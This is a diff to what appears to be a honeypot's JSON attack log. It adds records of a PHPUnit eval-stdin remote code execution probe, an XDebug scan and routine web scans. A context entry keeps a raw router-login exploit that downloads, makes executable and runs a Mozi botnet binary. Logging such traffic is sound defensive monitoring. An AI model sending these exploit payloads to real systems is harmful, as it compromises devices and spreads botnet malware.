@@ -2979,5 +2979,49 @@
     "node": "Droplet-BLR",
     "technique": "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0\r\n\r\n20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Netlink.m;chmod%20777%20/tmp/Netlink.m;/tmp/Netlink.m&waninf=1_INTERNET_R_VID_154 HTTP/1.0",
     "total_attacks": 1
+  },
+  {
+    "timestamp": "2026-06-01T08:40:59.977558+00:00",
+    "ip": "5.189.185.18",
+    "classification": "PHP RCE Attempt",
+    "severity": "Critical",
+    "risk_score": 10,
+    "summary": "An attacker attempted remote code execution via a known PHPUnit vulnerability.",
+    "node": "Droplet-LON",
+    "technique": "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\r\nHost: 134.209.18.105:80\r\nUpgrade-Insecure-Requests: 1\r\nAccept: */*\r\nUser-Agent: libredtail-http\r\nConnection: keep-alive\r\nContent-Type: text/plain\r\nContent-Length: 33\r\n\r\n<?php echo(md5(\"Hello PHPUnit\"));",
+    "total_attacks": 1
+  },
+  {
+    "timestamp": "2026-05-30T19:35:50.697298+00:00",
+    "ip": "79.124.40.174",
+    "classification": "Debug Parameter Scan",
+    "severity": "High",
+    "risk_score": 8,
+    "summary": "An attacker scanned for exposed XDebug sessions, which could lead to information disclosure or remote code execution.",
+    "node": "Droplet-BLR",
+    "technique": "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1\r\nHost: 168.144.120.121:80\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\r\nAccept-Encoding: gzip\r\nConnection: close",
+    "total_attacks": 1
+  },
+  {
+    "timestamp": "2026-05-30T20:49:25.444315+00:00",
+    "ip": "66.132.172.217",
+    "classification": "Web Scanner",
+    "severity": "Low",
+    "risk_score": 2,
+    "summary": "A web scanner performed basic reconnaissance by requesting common web resources.",
+    "node": "Droplet-BLR",
+    "technique": "GET /robots.txt HTTP/1.1\r\nHost: 168.144.120.121\r\nUser-Agent: Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)\r\nAccept: */*\r\nAccept-Encoding: gzip",
+    "total_attacks": 1
+  },
+  {
+    "timestamp": "2026-05-30T20:17:08.241716+00:00",
+    "ip": "47.85.109.87",
+    "classification": "Web Scanner",
+    "severity": "Low",
+    "risk_score": 2,
+    "summary": "A web scanner initiated a standard GET request to the root directory.",
+    "node": "Droplet-BLR",
+    "technique": "GET / HTTP/1.0",
+    "total_attacks": 1
   }
 ]
